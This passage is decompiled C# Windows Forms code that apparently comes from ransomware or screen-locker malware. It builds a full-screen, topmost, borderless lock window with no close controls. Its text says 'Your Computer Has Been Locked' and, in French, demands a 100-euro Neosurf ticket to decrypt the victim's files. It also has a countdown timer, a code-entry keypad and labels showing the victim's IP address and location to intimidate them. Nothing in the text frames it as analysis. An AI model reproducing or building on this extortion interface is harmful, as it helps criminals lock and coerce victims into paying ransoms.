		((ButtonBase)button27).set_UseVisualStyleBackColor(false);
		((Control)button18).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button18).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button18).set_Location(new Point(209, 60));
		((Control)button18).set_Name("button18");
		((Control)button18).set_Size(new Size(23, 23));
		((Control)button18).set_TabIndex(17);
		((Control)button18).set_Text("I");
		((ButtonBase)button18).set_UseVisualStyleBackColor(false);
		((Control)button28).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button28).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button28).set_Location(new Point(209, 89));
		((Control)button28).set_Name("button28");
		((Control)button28).set_Size(new Size(23, 23));
		((Control)button28).set_TabIndex(27);
		((Control)button28).set_Text("K");
		((ButtonBase)button28).set_UseVisualStyleBackColor(false);
		((Control)button17).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button17).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button17).set_Location(new Point(180, 60));
		((Control)button17).set_Name("button17");
		((Control)button17).set_Size(new Size(23, 23));
		((Control)button17).set_TabIndex(18);
		((Control)button17).set_Text("U");
		((ButtonBase)button17).set_UseVisualStyleBackColor(false);
		((Control)button29).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button29).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button29).set_Location(new Point(238, 89));
		((Control)button29).set_Name("button29");
		((Control)button29).set_Size(new Size(23, 23));
		((Control)button29).set_TabIndex(26);
		((Control)button29).set_Text("L");
		((ButtonBase)button29).set_UseVisualStyleBackColor(false);
		((Control)button16).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button16).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button16).set_Location(new Point(151, 60));
		((Control)button16).set_Name("button16");
		((Control)button16).set_Size(new Size(23, 23));
		((Control)button16).set_TabIndex(19);
		((Control)button16).set_Text("Y");
		((ButtonBase)button16).set_UseVisualStyleBackColor(false);
		((Control)button30).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button30).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button30).set_Location(new Point(267, 89));
		((Control)button30).set_Name("button30");
		((Control)button30).set_Size(new Size(23, 23));
		((Control)button30).set_TabIndex(25);
		((Control)button30).set_Text("M");
		((ButtonBase)button30).set_UseVisualStyleBackColor(false);
		((Control)button15).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button15).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button15).set_Location(new Point(122, 60));
		((Control)button15).set_Name("button15");
		((Control)button15).set_Size(new Size(23, 23));
		((Control)button15).set_TabIndex(20);
		((Control)button15).set_Text("T");
		((ButtonBase)button15).set_UseVisualStyleBackColor(false);
		((Control)button31).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button31).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button31).set_Location(new Point(6, 89));
		((Control)button31).set_Name("button31");
		((Control)button31).set_Size(new Size(23, 23));
		((Control)button31).set_TabIndex(24);
		((Control)button31).set_Text("Q");
		((ButtonBase)button31).set_UseVisualStyleBackColor(false);
		((Control)button14).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button14).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button14).set_Location(new Point(93, 60));
		((Control)button14).set_Name("button14");
		((Control)button14).set_Size(new Size(23, 23));
		((Control)button14).set_TabIndex(21);
		((Control)button14).set_Text("R");
		((ButtonBase)button14).set_UseVisualStyleBackColor(false);
		((Control)button3).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button3).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button3).set_Location(new Point(35, 60));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(23, 23));
		((Control)button3).set_TabIndex(23);
		((Control)button3).set_Text("Z");
		((ButtonBase)button3).set_UseVisualStyleBackColor(false);
		((Control)button4).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button4).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button4).set_Location(new Point(64, 60));
		((Control)button4).set_Name("button4");
		((Control)button4).set_Size(new Size(23, 23));
		((Control)button4).set_TabIndex(22);
		((Control)button4).set_Text("E");
		((ButtonBase)button4).set_UseVisualStyleBackColor(false);
		((Control)button38).set_Location(new Point(531, 4));
		((Control)button38).set_Name("button38");
		((Control)button38).set_Size(new Size(101, 22));
		((Control)button38).set_TabIndex(40);
		((Control)button38).set_Text("Couriger");
		((ButtonBase)button38).set_UseVisualStyleBackColor(true);
		((Control)button38).add_Click((EventHandler)button38_Click);
		((Control)button1).set_Location(new Point(531, 50));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(101, 53));
		((Control)button1).set_TabIndex(1);
		((Control)button1).set_Text("Valider");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)textBox1).set_Location(new Point(228, 4));
		((TextBoxBase)textBox1).set_MaxLength(4);
		((Control)textBox1).set_Name("textBox1");
		((TextBoxBase)textBox1).set_ReadOnly(true);
		((Control)textBox1).set_Size(new Size(79, 20));
		((Control)textBox1).set_TabIndex(0);
		label9.set_AutoEllipsis(true);
		((Control)label9).set_BackColor(Color.Transparent);
		((Control)label9).set_Font(new Font("Tahoma", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label9).set_ForeColor(Color.White);
		((Control)label9).set_Location(new Point(3, 6));
		((Control)label9).set_Margin(new Padding(6));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(246, 16));
		((Control)label9).set_TabIndex(44);
		((Control)label9).set_Text("Tapper ici  code  de Ticket Neosurf:  ");
		label11.set_AutoEllipsis(true);
		((Control)label11).set_BackColor(Color.Transparent);
		((Control)label11).set_Font(new Font("Tahoma", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label11).set_ForeColor(Color.White);
		((Control)label11).set_Location(new Point(6, 34));
		((Control)label11).set_Margin(new Padding(6));
		((Control)label11).set_Name("label11");
		((Control)label11).set_Size(new Size(246, 16));
		((Control)label11).set_TabIndex(46);
		((Control)label11).set_Text("Tapper ici  Votre email");
		((Control)panel3).set_Anchor((AnchorStyles)15);
		((Control)panel3).set_BackColor(Color.FromArgb(37, 37, 37));
		((Control)panel3).get_Controls().Add((Control)(object)label3);
		((Control)panel3).set_Location(new Point(3, 143));
		((Control)panel3).set_Name("panel3");
		((Control)panel3).set_Size(new Size(994, 44));
		((Control)panel3).set_TabIndex(1);
		((Control)label3).set_Anchor((AnchorStyles)15);
		label3.set_AutoEllipsis(true);
		((Control)label3).set_BackColor(Color.Transparent);
		((Control)label3).set_Font(new Font("Tahoma", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(6, 11));
		((Control)label3).set_Margin(new Padding(6));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(982, 21));
		((Control)label3).set_TabIndex(0);
		((Control)label3).set_Text("Vos Donnes Personnels Ont ete Crypter, Pour les decrypter Acheter un ticket neosurf de 100 euro");
		label3.set_TextAlign((ContentAlignment)32);
		tableLayoutPanel5.set_ColumnCount(3);
		tableLayoutPanel5.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 50f));
		tableLayoutPanel5.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 50f));
		tableLayoutPanel5.get_ColumnStyles().Add(new ColumnStyle((SizeType)1, 500f));
		tableLayoutPanel5.get_Controls().Add((Control)(object)tableLayoutPanel6, 2, 0);
		tableLayoutPanel5.get_Controls().Add((Control)(object)pictureBox7, 0, 0);
		((Control)tableLayoutPanel5).set_Dock((DockStyle)5);
		((Control)tableLayoutPanel5).set_Location(new Point(3, 3));
		((Control)tableLayoutPanel5).set_Name("tableLayoutPanel5");
		tableLayoutPanel5.set_RowCount(1);
		tableLayoutPanel5.get_RowStyles().Add(new RowStyle((SizeType)2, 100f));
		((Control)tableLayoutPanel5).set_Size(new Size(994, 64));
		((Control)tableLayoutPanel5).set_TabIndex(2);
		tableLayoutPanel6.set_ColumnCount(2);
		tableLayoutPanel6.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 24.6988f));
		tableLayoutPanel6.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 75.30121f));
		tableLayoutPanel6.get_Controls().Add((Control)(object)label6, 0, 0);
		tableLayoutPanel6.get_Controls().Add((Control)(object)label5, 1, 0);
		((Control)tableLayoutPanel6).set_Dock((DockStyle)5);
		((Control)tableLayoutPanel6).set_Location(new Point(497, 3));
		((Control)tableLayoutPanel6).set_Name("tableLayoutPanel6");
		tableLayoutPanel6.set_RowCount(1);
		tableLayoutPanel6.get_RowStyles().Add(new RowStyle((SizeType)2, 100f));
		((Control)tableLayoutPanel6).set_Size(new Size(494, 58));
		((Control)tableLayoutPanel6).set_TabIndex(2);
		label6.set_AutoEllipsis(true);
		((Control)label6).set_BackColor(Color.Transparent);
		((Control)label6).set_Font(new Font("Segoe UI", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_ForeColor(Color.White);
		((Control)label6).set_Location(new Point(6, 6));
		((Control)label6).set_Margin(new Padding(6));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(98, 46));
		((Control)label6).set_TabIndex(1);
		((Control)label6).set_Text("You IP Adress : \r\nYou Provider  :\r\nYou Location  : ");
		label5.set_AutoEllipsis(true);
		((Control)label5).set_BackColor(Color.Transparent);
		((Control)label5).set_Font(new Font("Segoe UI", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(Color.OrangeRed);
		((Control)label5).set_Location(new Point(128, 6));
		((Control)label5).set_Margin(new Padding(6));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(360, 46));
		((Control)label5).set_TabIndex(0);
		((Control)pictureBox7).set_Location(new Point(3, 3));
		((Control)pictureBox7).set_Name("pictureBox7");
		((Control)pictureBox7).set_Size(new Size(169, 50));
		pictureBox7.set_TabIndex(3);
		pictureBox7.set_TabStop(false);
		((Control)panel6).set_Anchor((AnchorStyles)12);
		((Control)panel6).set_BackColor(Color.Red);
		((Control)panel6).get_Controls().Add((Control)(object)label7);
		((Control)panel6).set_Location(new Point(3, 73));
		((Control)panel6).set_Name("panel6");
		((Control)panel6).set_Size(new Size(994, 64));
		((Control)panel6).set_TabIndex(3);
		((Control)label7).set_Anchor((AnchorStyles)15);
		((Control)label7).set_Font(new Font("Tahoma", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label7).set_ForeColor(Color.White);
		((Control)label7).set_Location(new Point(274, 18));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(528, 29));
		((Control)label7).set_TabIndex(0);
		((Control)label7).set_Text("Your Computer Has Been Locked");
		label7.set_TextAlign((ContentAlignment)32);
		((Control)panel9).get_Controls().Add((Control)(object)label10);
		((Control)panel9).get_Controls().Add((Control)(object)pictureBox8);
		((Control)panel9).set_Dock((DockStyle)5);
		((Control)panel9).set_Location(new Point(1003, 193));
		((Control)panel9).set_Name("panel9");
		((Control)panel9).set_Padding(new Padding(15));
		((Control)panel9).set_Size(new Size(305, 471));
		((Control)panel9).set_TabIndex(4);
		label10.set_AutoEllipsis(true);
		((Control)label10).set_BackColor(Color.Transparent);
		((Control)label10).set_Font(new Font("Tahoma", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label10).set_ForeColor(Color.White);
		((Control)label10).set_Location(new Point(3, 19));
		((Control)label10).set_Margin(new Padding(6));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(302, 96));
		((Control)label10).set_TabIndex(46);
		((Control)label10).set_Text("code  de Ticket Neosurf \r\nest disponible en vente chez :\r\n");
		label10.set_TextAlign((ContentAlignment)32);
		((Control)pictureBox8).set_BackgroundImage((Image)(object)Resources.POS);
		((Control)pictureBox8).set_BackgroundImageLayout((ImageLayout)4);
		((Control)pictureBox8).set_Location(new Point(9, 124));
		((Control)pictureBox8).set_Name("pictureBox8");
		((Control)pictureBox8).set_Size(new Size(287, 126));
		pictureBox8.set_TabIndex(45);
		pictureBox8.set_TabStop(false);
		counter.set_AutoEllipsis(true);
		((Control)counter).set_BackColor(Color.Transparent);
		((Control)counter).set_Font(new Font("Tahoma", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)counter).set_ForeColor(Color.White);
		((Control)counter).set_Location(new Point(1006, 146));
		((Control)counter).set_Margin(new Padding(6));
		((Control)counter).set_Name("counter");
		((Control)counter).set_Size(new Size(299, 38));
		((Control)counter).set_TabIndex(47);
		((Control)counter).set_Text("13:22:00");
		counter.set_TextAlign((ContentAlignment)32);
		label12.set_AutoEllipsis(true);
		((Control)label12).set_BackColor(Color.Transparent);
		((Control)label12).set_Font(new Font("Tahoma", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label12).set_ForeColor(Color.White);
		((Control)label12).set_Location(new Point(1006, 76));
		((Control)label12).set_Margin(new Padding(6));
		((Control)label12).set_Name("label12");
		((Control)label12).set_Size(new Size(299, 58));
		((Control)label12).set_TabIndex(48);
		((Control)label12).set_Text("Temps Restant");
		label12.set_TextAlign((ContentAlignment)32);
		timer1.set_Interval(1000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		backgroundWorker1.WorkerReportsProgress = true;
		backgroundWorker1.DoWork += backgroundWorker1_DoWork;
		backgroundWorker1.RunWorkerCompleted += backgroundWorker1_RunWorkerCompleted;
		label14.set_AutoEllipsis(true);
		((Control)label14).set_BackColor(Color.Transparent);
		((Control)label14).set_Font(new Font("Segoe UI", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label14).set_ForeColor(Color.OrangeRed);
		((Control)label14).set_Location(new Point(6, 16));
		((Control)label14).set_Margin(new Padding(6));
		((Control)label14).set_Name("label14");
		((Control)label14).set_Size(new Size(185, 46));
		((Control)label14).set_TabIndex(1);
		timer2.set_Enabled(true);
		timer2.set_Interval(500);
		timer2.add_Tick((EventHandler)timer2_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(51, 51, 51));
		((Form)this).set_ClientSize(new Size(1311, 667));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)tableLayoutPanel1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Control)this).set_Text("Form1");
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Shown((EventHandler)Form1_Shown);
		((Control)tableLayoutPanel1).ResumeLayout(false);
		((Control)tableLayoutPanel2).ResumeLayout(false);
		((Control)tableLayoutPanel3).ResumeLayout(false);
		((Control)panel4).ResumeLayout(false);
		((ISupportInitialize)pictureBox3).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)panel1).ResumeLayout(false);
		((Control)tableLayoutPanel4).ResumeLayout(false);
		((Control)panel2).ResumeLayout(false);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)panel5).ResumeLayout(false);
		((Control)tableLayoutPanel7).ResumeLayout(false);
		((Control)panel7).ResumeLayout(false);
		((Control)tableLayoutPanel8).ResumeLayout(false);
		((Control)tableLayoutPanel9).ResumeLayout(false);
		((ISupportInitialize)pictureBox6).EndInit();
		((ISupportInitialize)pictureBox5).EndInit();
		((ISupportInitialize)pictureBox4).EndInit();
		((Control)panel8).ResumeLayout(false);
		((Control)panel8).PerformLayout();
		((Control)keypad).ResumeLayout(false);
		((Control)panel3).ResumeLayout(false);
		((Control)tableLayoutPanel5).ResumeLayout(false);
		((Control)tableLayoutPanel6).ResumeLayout(false);
		((ISupportInitialize)pictureBox7).EndInit();
		((Control)panel6).ResumeLayout(false);
		((Control)panel9).ResumeLayout(false);
		((ISupportInitialize)pictureBox8).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
